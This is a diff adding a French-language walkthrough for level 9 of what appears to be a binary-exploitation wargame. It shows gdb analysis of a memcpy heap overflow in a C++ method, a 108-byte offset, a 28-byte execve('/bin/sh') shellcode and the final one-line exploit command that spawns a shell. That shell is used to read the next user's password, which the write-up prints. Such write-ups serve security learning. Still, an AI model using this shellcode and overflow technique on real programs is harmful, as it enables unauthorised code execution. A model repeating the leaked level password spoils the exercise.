@@ -1,0 +1,62 @@
+LEVEL 9
+-------
+
+1.	gdb level9
+
+
+2.	En analysant le code on voit qu'il n'y a aucun appel à "/bin/sh"
+	ou aucun affichage du pass.
+
+3.	On lance le programme avec un argument et avec beaucoup de
+	caractères.
+	run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
+	
+	Le programme segfault.
+
+4.	disas _ZN1N13setAnnotationEPc
+	memcpy est présent et est exploitable.
+
+5.	Après quelques tests on trouve un offset de 108.
+	Nous allons donc utiliser le shellcode du level2.
+	Shellcode				=	"\x31\xdb\x31\xd2\x31\xc9\x51\x68"
+								"\x6e\x2f\x73\x68\x68\x2f\x2f\x62"
+								"\x69\x89\xe3\x31\xc0\xb0\x0b\x83"
+								"\xe4\xf0\xcd\x80"
+	Le but de ce level est d'envoyer le shellcode à la place de la fonction.
+	Dans un premier temps il nous faut l'adresse à laquelle se trouve notre
+	string au moment de la fonction.
+
+	b *0x08048677
+	run $(python -c 'print "A"*108')
+	x $esp
+	0xbffff6a0:	0x0804a008 ----> Haut de stack.
+	ni ---> On avance d'une instruction machine
+	x/29 0x0804a008 -----> On affiche les 50 données à partir de l'adresse 0x0804a008
+	0x804a008:	0x08048848	0x41414141	0x41414141	0x41414141
+	0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x804a048:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x804a058:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x804a068:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x804a078:	0x08048848
+
+	Notre exploit va donc débuter à l'adresse juste après 0x804a008 donc 0x804a010.
+	Cela va servir à dire que notre shellcode va débuter à partir de cette adresse.
+	Donc pour l'instant nous avons:
+	python -c 'print "\x10\xa0\x04\x08"+"\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\x83\xe4\xf0\xcd\x80"'
+
+	Taille du shellcode = 28octets.
+	Taille adresse départ = 4octets.
+	Il faut remplir les 108 octets, 108-28-4 = 76 octets.
+	On ajoute à la commande python un "A"*76 à la fin et une adresse disponible.
+
+6.	Commande finale:
+	./level9 $(python -c 'print "\x10\xa0\x04\x08"+"\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\x83\xe4\xf0\xcd\x80"+"A"*76+"\x0c\xa0\x04\x08"')
+	$ whoami
+	bonus0
+	$ cat /home/user/bonus0/.pass
+	f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+7.	su bonus0
+	f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
